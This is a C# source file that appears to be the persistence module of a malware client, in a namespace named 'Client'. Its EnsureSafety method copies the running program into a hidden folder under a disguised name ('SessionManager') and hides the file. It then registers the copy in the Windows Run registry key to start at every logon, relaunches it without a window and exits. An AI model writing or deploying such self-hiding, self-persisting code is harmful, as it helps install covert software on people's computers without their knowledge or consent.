using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;

namespace Client
{
    class CoreFunctionality
    {
        public static string BSName = "SessionManager";
        public static string UserName = Environment.UserName;
        public static string PreferredDirectory = @$"C:\Users\{UserName}\{BSName}\";
        public static string PreferredFullPath = $"{PreferredDirectory}{BSName}.exe";
        public static string CurrentDirectory = @$"{Directory.GetCurrentDirectory()}\";
        public static string CurrentFileName = $@"{System.Diagnostics.Process.GetCurrentProcess().ProcessName}.exe";
        public static string CurrentFullPath = $"{CurrentDirectory}{CurrentFileName}";

        public static bool CompareFiles(string file1, string file2)
        {
            int File1Byte;
            int File2Byte;
            FileStream Fs1;
            FileStream Fs2;

            try
            {
                Fs1 = new FileStream(file1, FileMode.Open, FileAccess.Read);
                Fs2 = new FileStream(file2, FileMode.Open, FileAccess.Read);
            }
            catch (System.IO.FileNotFoundException)
            {
                return false;
            }

            if (Fs1.Length != Fs2.Length)
            {
                Fs1.Close();
                Fs2.Close();

                return false;
            }

            do
            {
                File1Byte = Fs1.ReadByte();
                File2Byte = Fs2.ReadByte();
            }
            while ((File1Byte == File2Byte) && (File1Byte != -1));

            Fs1.Close();
            Fs2.Close();

            return (File1Byte - File2Byte) == 0;
        }

        public static void EnsureSafety(string[] args)
        {
            
            if (args.Contains("-startup"))
            {
                return;
            }

            var directory = Directory.CreateDirectory(PreferredDirectory);
            directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            
            if (!CompareFiles(CurrentFullPath, PreferredFullPath))
            {
                if (File.Exists(PreferredFullPath))
                {
                    File.Delete(PreferredFullPath);
                }
                File.Copy(CurrentFullPath, PreferredFullPath, true);
                File.SetAttributes(PreferredFullPath, File.GetAttributes(PreferredFullPath) | FileAttributes.Hidden);
            }

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue(BSName, "\"" + PreferredFullPath + "\" -startup");
            }

            var StartInfo = new ProcessStartInfo();

            StartInfo.FileName = PreferredFullPath;
            StartInfo.CreateNoWindow = true;
            StartInfo.UseShellExecute = false;
            StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            StartInfo.Arguments = "-startup";

            Process.Start(StartInfo);

            Environment.Exit(0);
        }
    }
}
